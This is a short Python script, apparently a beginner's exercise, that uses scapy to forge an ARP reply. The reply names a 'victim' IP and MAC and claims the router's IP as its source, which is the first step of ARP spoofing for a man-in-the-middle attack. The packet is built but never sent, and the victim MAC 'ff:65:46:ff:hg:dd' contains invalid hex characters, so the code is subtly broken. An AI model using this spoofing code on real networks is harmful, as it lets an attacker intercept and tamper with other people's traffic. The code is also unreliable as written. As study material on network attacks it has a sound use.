#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="192.168.159.3", hwdst="ff:65:46:ff:hg:dd", psrc="192.168.159.1") #  this is set arp class

# op=2 is only create response not creating request or pdst and hwdst set the ip of victims and set mac address victims, psrc set router ip.

# use the python interpreter to find the field. ex. ls(scapy.ARP)
